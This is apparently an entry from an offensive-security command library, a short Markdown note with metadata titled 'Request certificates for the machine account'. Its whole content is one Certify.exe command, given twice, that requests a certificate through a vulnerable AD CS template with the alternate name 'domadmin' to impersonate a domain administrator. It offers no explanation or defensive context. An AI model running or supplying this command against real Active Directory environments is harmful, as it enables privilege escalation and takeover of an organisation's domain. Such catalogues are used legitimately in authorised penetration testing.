---
id: 1d445210-11cc-490c-ab5e-fbf9fccc452d
name: Request certificates for the machine account
type: command
executor: bash
data: Certify.exe request /ca:dc.domain.local\domain-DC-CA /template:VulnTemplate
  /altname:domadmin
output: null
created_at: '2023-04-06T03:56:05.731999+00:00'
updated_at: '2023-04-10T20:25:45.495574+00:00'
---

# Request certificates for the machine account

```bash
Certify.exe request /ca:dc.domain.local\domain-DC-CA /template:VulnTemplate /altname:domadmin
```
